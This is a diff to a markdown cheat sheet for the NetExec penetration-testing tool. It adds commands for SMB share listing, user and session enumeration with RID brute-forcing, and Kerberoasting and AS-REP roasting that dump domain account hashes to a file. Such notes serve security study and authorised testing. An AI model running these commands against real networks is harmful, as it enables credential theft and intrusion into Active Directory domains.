@@ -21,9 +21,18 @@ netexec smb target -u username -p password --local-auth
 
 ## SMB
 NetExec can be used to enumerate and exploit SMB.
-```
+```bash
+# List Shares
 netexec smb target -u '' -p '' --shares  
-netexec smb target -u username -p password --shares
+
+# Enumerate Information
+netexec smb target -u username -p password --groups --local-groups --loggedon-users --rid-brute --sessions --users --shares --pass-pol
+
+# Kerberoast, target must be DC
+netexec ldap target -u username -p password --kerberoasting hash.txt  
+
+# ASREP-Roast, target must be DC
+netexec ldap target -u username -p password --asreproast hash.txt
 ```
 
 ## Resources
